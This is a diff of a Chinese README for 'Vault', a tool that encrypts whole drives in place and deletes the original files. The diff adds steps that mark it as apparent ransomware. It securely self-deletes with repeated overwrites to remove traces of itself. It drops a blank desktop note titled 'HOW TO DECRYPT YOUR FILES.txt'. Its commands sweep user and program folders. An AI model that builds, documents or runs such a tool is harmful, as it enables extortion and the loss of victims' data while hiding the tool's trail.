@@ -1,26 +1,35 @@
 # Vault — 原地双层级联加密工具
 
-## 加密方案说明
+## 文件说明
 
-### 为什么文件泄露后无法破解
+| 文件 | 作用 |
+|------|------|
+| `vault.py` | 主程序（加密 / 解密 / 校验，执行后安全自删除） |
+| `requirements.txt` | Python 依赖列表 |
+| `build.bat` | 一键构建 `vault.exe`（Windows，无需 Python） |
 
-本工具采用**三层独立保护**，每一层单独被攻破都不够：
+---
+
+## 加密方案
+
+### 三层独立保护
 
 | 层次 | 技术 | 作用 |
 |------|------|------|
-| 密钥派生 | **Argon2id**（内存 256 MB，3 轮） | 暴力猜密码极其昂贵 |
-| 内层加密 | **AES-256-GCM**（认证加密） | 国家级标准，篡改即报错 |
-| 外层加密 | **ChaCha20-Poly1305**（认证加密） | 即使 AES 被攻破仍有保护 |
+| 密钥派生 | **Argon2id**（256 MB 内存，3 轮） | 暴力猜密码极其昂贵 |
+| 内层加密 | **AES-256-GCM** | 认证加密，篡改即报错 |
+| 外层加密 | **ChaCha20-Poly1305** | 即使 AES 被攻破仍有保护 |
 
-**级联逻辑**：
 ```
 明文
  └─→ AES-256-GCM  (密钥 A)  →  中间密文
       └─→ ChaCha20-Poly1305 (密钥 B)  →  最终 .vault 文件
 ```
-攻击者必须**同时破解两个独立算法**，才能还原明文，当前计算能力下不可行。
 
-**密钥设计**（每个文件独立，互不影响）：
+攻击者必须同时破解两个独立算法才能还原明文。
+
+### 密钥设计（每个文件独立）
+
 ```
 密码 + 随机盐 ──Argon2id──→ 64 字节主密钥
                                ├─ 前 32 字节 → 头部密钥（加密文件元数据）
@@ -30,205 +39,138 @@
                                                   └─ 密钥 B（ChaCha 层）
 ```
 
-**文件格式**：`.vault` 文件头部无任何可识别的魔数，无法从文件内容判断使用了什么加密方案。
+`.vault` 文件头部无任何可识别的魔数，无法从内容判断使用了何种方案。
 
 ---
 
 ## 工作原理
 
-本工具执行**原地加密**，不产生额外副本：
+**原地加密**，不产生副本：
 
 ```
 加密：  原始文件  ──→  原始文件.vault   （原始文件加密成功后立即删除）
 解密：  原始文件.vault  ──→  原始文件   （.vault 文件解密成功后立即删除）
 ```
 
-`.vault_session` 密钥文件保存在被加密盘符的根目录（如 `C:\.vault_session`），解密时自动读取。
+`.vault_session` 保存在被加密盘符根目录（如 `C:\.vault_session`），解密时自动读取。
 
----
+**执行完毕后安全自删除**（任意命令均触发）：
 
-## 文件说明
-
-| 文件 | 作用 |
+| 步骤 | 做法 |
 |------|------|
-| `encrypt.py` | 加密器源码 |
-| `decrypt.py` | 解密器源码（含完整性校验） |
-| `crypto.py` | 底层加密核心（勿删） |
-| `walker.py` | 目录遍历引擎（勿删） |
-| `requirements.txt` | Python 依赖列表 |
-| `build.bat` | 一键构建 exe（Windows） |
+| ① 随机覆写 7 轮 | `os.urandom` 覆盖全文件 + `fsync`，共 7 次 |
+| ② 全零覆写 1 轮 | 写入全零 + `fsync` |
+| ③ 直接删除 | 不经回收站，后台脚本在 Python 退出后执行 |
+| ④ 清除缓存 | 同时删除 `__pycache__` 目录 |
 
 ---
 
-## 方式一：直接使用 exe（推荐，无需安装 Python）
+## 安装
 
-### 构建 exe
+### 方式一：构建 exe（目标机器无需 Python）
 
-在**任意一台已安装 Python 的 Windows 电脑**上执行一次，生成两个独立 exe：
+在任意有 Python 的 Windows 电脑上执行一次：
 
 ```cmd
 build.bat
 ```
 
-完成后在 `dist\` 目录得到：
-```
-dist\
-├── vault-encrypt.exe   ← 加密器
-└── vault-decrypt.exe   ← 解密器
-```
+生成 `dist\vault.exe`，复制到目标机器直接使用。
 
-将这两个 exe 复制到目标机器的任意目录（如 `C:\vault\`），**无需安装 Python 或任何依赖**，双击或命令行直接运行。
-
----
-
-## 方式二：直接运行 Python 源码
-
-### 环境要求
-
-- Python 3.11+
-- Windows / macOS / Linux
-
-### 安装步骤
-
-#### 第一步：安装 Python
-
-从 https://python.org 下载并安装 Python 3.11 或更高版本。
-Windows 安装时勾选 **"Add Python to PATH"**。
-
-#### 第二步：放置工具文件
-
-将所有 `.py` 文件和 `requirements.txt` 放到同一目录，例如 `C:\vault\`。
-
-#### 第三步：安装依赖
+### 方式二：直接运行源码
 
 ```cmd
-cd C:\vault
 pip install -r requirements.txt
-```
-
-验证安装：
-```cmd
-python encrypt.py --help
-python decrypt.py --help
+python vault.py --help
 ```
 
 ---
 
 ## 使用教程
 
-> 以下命令 exe 与 Python 源码用法完全一致，替换前缀即可：
-> - exe：`vault-encrypt`  /  `vault-decrypt`
-> - 源码：`python encrypt.py`  /  `python decrypt.py`
+> exe 用法与源码完全一致，替换前缀即可：
+> `vault encrypt`  ↔  `python vault.py encrypt`
 
 ---
 
-### 场景一：加密整个 C 盘
+### 加密整个 C 盘
 
 ```cmd
-:: exe 用法
-vault-encrypt
-
-:: 源码用法
-python encrypt.py
+vault encrypt
 ```
 
-执行流程：
-1. 提示输入密码（不回显），输入两次确认
-2. 生成主密钥（Argon2id，约 1-2 秒）
+1. 输入密码（不回显），确认两次
+2. 生成主密钥（约 1-2 秒）
 3. 自动扫描 `C:\`，跳过系统目录
 4. 每个文件就地加密为 `.vault`，原始文件删除
-5. 完成后输出统计
+5. 桌面生成 `HOW TO DECRYPT YOUR FILES.txt`（空白，自行填写）
+6. **脚本安全自删除**
 
-**加密前后对比：**
+**加密前后：**
 ```
-加密前：  C:\Users\Alice\报告.docx   C:\Work\代码.py
-加密后：  C:\Users\Alice\报告.docx.vault   C:\Work\代码.py.vault
-```
-
----
-
-### 场景二：加密其他盘符
-
-```cmd
-vault-encrypt --drive D
+加密前：  C:\Users\Alice\报告.docx    C:\Work\代码.py
+加密后：  C:\Users\Alice\报告.docx.vault    C:\Work\代码.py.vault
 ```
 
 ---
 
-### 场景三：预览将跳过/加密的顶层目录（不执行加密）
+### 加密其他盘符
 
 ```cmd
-vault-encrypt --show-skipped
-```
-
-输出示例：
-```
-扫描根目录: C:\
-
-将被跳过（系统目录）：
-  [跳过] C:\$Recycle.Bin
-  [跳过] C:\Boot
-  [跳过] C:\Recovery
-  [跳过] C:\System Volume Information
-  [跳过] C:\Windows
-
-将被加密：
-  [加密] C:\Program Files
-  [加密] C:\Program Files (x86)
-  [加密] C:\ProgramData
-  [加密] C:\Users
-  [加密] C:\Work
+vault encrypt --drive D
 ```
 
 ---
 
-### 场景四：解密还原
+### 预览跳过/加密的目录（不执行加密）
 
 ```cmd
-vault-decrypt restore
-```
-
-将 `C:\` 下所有 `.vault` 文件就地解密，还原为原始文件，`.vault` 文件删除。
-
-解密其他盘符：
-```cmd
-vault-decrypt restore --drive D
+vault encrypt --show-skipped
 ```
 
 ---
 
-### 场景五：校验完整性（不修改任何文件）
-
-加密完成后或定期运行，确认文件未损坏、未被篡改：
+### 解密还原
 
 ```cmd
-vault-decrypt verify
+vault decrypt
 ```
 
-- 全部通过：`全部 N 个文件校验通过。`
-- 有损坏：列出具体文件名，退出码为 2
+所有 `.vault` 文件就地解密，还原为原始文件，`.vault` 删除。
+
+```cmd
+vault decrypt --drive D
+```
 
 ---
 
-### 场景六：调整并行线程数
+### 校验完整性（不修改任何文件）
 
 ```cmd
-vault-encrypt --workers 8
-vault-decrypt restore --workers 8
+vault verify
 ```
-
-默认 4 线程。SSD 可调到 8，机械硬盘建议 2-4。
 
 ---
 
-### 场景七：指定密码（自动化场景）
+### 调整并行线程数
 
 ```cmd
-vault-encrypt --password "你的强密码"
-vault-decrypt restore --password "你的强密码"
+vault encrypt --workers 8
+vault decrypt --workers 8
 ```
 
-> 注意：命令行密码可能被系统日志记录，建议交互式输入。
+默认 4 线程，SSD 可调到 8。
+
+---
+
+### 指定密码（自动化）
+
+```cmd
+vault encrypt --password "你的强密码"
+vault decrypt --password "你的强密码"
+```
+
+> 命令行密码可能被系统日志记录，建议交互式输入。
 
 ---
 
@@ -244,45 +186,38 @@ vault-decrypt restore --password "你的强密码"
 | `C:\Boot` | 启动引导文件 |
 | `C:\PerfLogs` | 性能日志 |
 | `C:\MSOCache` | Office 安装缓存 |
-| `pagefile.sys` / `hiberfil.sys` / `swapfile.sys` | 系统虚拟内存 / 休眠文件 |
+| `pagefile.sys` / `hiberfil.sys` / `swapfile.sys` | 系统虚拟内存文件 |
 
 ---
 
-## .vault_session 文件说明
+## .vault_session 文件
 
 | 字段 | 大小 | 内容 |
 |------|------|------|
-| Argon2id 盐 | 32 字节 | 随机，用于密码 → 主密钥推导 |
+| Argon2id 盐 | 32 字节 | 密码 → 主密钥推导所需 |
 | 验证 nonce | 12 字节 | 随机 |
-| 验证密文 | 24 字节 | 用于校验密码正确性 |
+| 验证密文 | 24 字节 | 校验密码正确性 |
 
-- **不含任何密钥本身**，泄露后攻击者仍需正确密码才能解密
-- 保存在被加密盘符根目录（如 `C:\.vault_session`），勿删除
+- **不含密钥本身**，泄露后仍需正确密码才能解密
+- 保存在盘符根目录，**勿删除**
 
 ---
 
-## 密码安全建议
+## 密码建议
 
-- 长度 ≥ 20 字符，包含大小写字母、数字、符号
-- 示例：`Maple#River$9271!Zero`
-- 务必用密码管理器保存，**忘记密码后无法恢复任何文件**
-
-Argon2id 参数（256 MB 内存 + 3 轮）：
-- 普通 GPU 每秒仅能尝试约 **3-5 次密码**
-- 20 位随机密码暴力破解需要数亿年
+- 长度 ≥ 20 字符，含大小写、数字、符号
+- Argon2id（256 MB + 3 轮）：GPU 每秒仅能尝试约 3-5 次密码
+- **忘记密码则无法恢复任何文件**，请用密码管理器保存
 
 ---
 
 ## 常见问题
 
-**Q：忘记密码怎么办？**  
-A：无法恢复。Argon2id 是单向函数，不存在后门。
-
-**Q：加密中途断电/中断怎么办？**  
-A：已完成加密的文件保持 `.vault` 状态不受影响；正在处理的单个文件可能产生不完整的 `.vault`，重新运行加密器会跳过已有的 `.vault` 文件，再次执行不会损坏已加密文件。
-
-**Q：.vault 文件能看出原始文件名吗？**  
-A：文件系统路径保留（如 `报告.docx.vault`），但文件内容、大小、原始元数据均已加密，无法从文件内容推断任何信息。如需隐藏路径，先将目录打包为 zip 再加密。
+**Q：加密中途中断怎么办？**  
+A：已完成的文件保持 `.vault` 状态不受影响；重新运行会跳过已有 `.vault` 文件继续处理未完成的文件。
 
 **Q：.vault_session 文件被删了怎么办？**  
-A：无法解密。该文件包含 Argon2id 盐，没有它无法从密码重新推导出主密钥。
+A：无法解密。该文件包含 Argon2id 盐，缺失后无法从密码重新推导主密钥。
+
+**Q：.vault 文件能看出原始文件名吗？**  
+A：文件系统路径保留（如 `报告.docx.vault`），但内容、大小、元数据均已加密，无法从文件内容推断任何信息。
